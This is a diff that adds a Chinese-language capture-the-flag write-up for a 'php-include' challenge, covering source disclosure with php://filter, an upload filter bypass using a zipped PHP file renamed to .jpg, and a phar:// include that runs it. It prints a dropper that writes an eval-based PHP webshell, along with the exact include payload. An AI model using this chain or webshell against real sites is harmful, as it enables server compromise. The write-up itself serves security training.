@@ -21,7 +21,29 @@ passwd=123456a&num=1e8
 
 ##### php-include
 
+扫描目录找到include.php和upload.php，大概是上传一个webshell并include执行的题目。include.php中提示了参数为file，尝试伪协议读取源代码，?file=php://filter/read=convert.base64-encode/resource=include，可以发现所有被include的文件都会加上.php后缀。
 
+![](https://notes.sjtu.edu.cn/uploads/upload_bcecbeffb85d79c57391c44aec1dd75b.png)
+
+![](https://notes.sjtu.edu.cn/uploads/upload_1a82ddc8494caf603a41a1ee72dee264.png)
+
+![](https://notes.sjtu.edu.cn/uploads/upload_340834646547a742c943540c81cfa2a8.png)
+
+upload.php限制了文件扩展名，只需要编写hell.php（用于生成webshell）进行压缩，再将压缩包后缀改为.jpg，上传后得到路径。
+
+```php
+<?php file_put_contents('shell.php','<?php eval($_POST[2])?>'); ?>
+```
+
+![](https://notes.sjtu.edu.cn/uploads/upload_3d095a49281d34f98dae5de62f5e0281.png)
+
+使用phar伪协议可以将hell.jpg内的hell.php文件执行，在网站根目录生成webshell，使用蚁剑连接即可得到flag。
+
+```
+?file=phar:///uploads/hell.jpg/hell.php
+```
+
+![](https://notes.sjtu.edu.cn/uploads/upload_62417c8a1133ed9b09ef5de578f49e08.png)
 
 ##### smarty
 
